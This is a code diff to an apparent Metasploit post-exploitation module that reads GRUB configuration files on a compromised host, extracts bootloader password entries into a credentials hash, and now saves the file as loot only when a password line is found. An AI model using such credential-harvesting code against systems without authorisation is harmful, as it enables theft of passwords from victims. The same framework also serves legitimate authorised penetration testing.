@@ -42,9 +42,11 @@ class MetasploitModule < Msf::Post
 
     idx = 0
     contents = read_file(file)
+    have_pass = false
     contents.each_line do |line|
       next unless line.start_with?('password')
 
+      have_pass = true
       pass_line = line.strip.split(' ')
       unless pass_line.length == 3
         print_status("Unknown Grub password convention. Printing line")
@@ -64,12 +66,15 @@ class MetasploitModule < Msf::Post
           @creds_hash[pass_line[1]] = pass_line[2]
         end
       else
-        print_status("Unknown Grub password convention")
+        print_status("Unknown Grub password convention. Printing line")
+        print_status(line)
       end
     end
 
-    file_loc = store_loot("grub.config", "text/plain", session, contents)
-    print_good("#{file} saved to #{file_loc}")
+    if have_pass
+      file_loc = store_loot("grub.config", "text/plain", session, contents)
+      print_good("#{file} saved to #{file_loc}")
+    end
   end
 
   def run
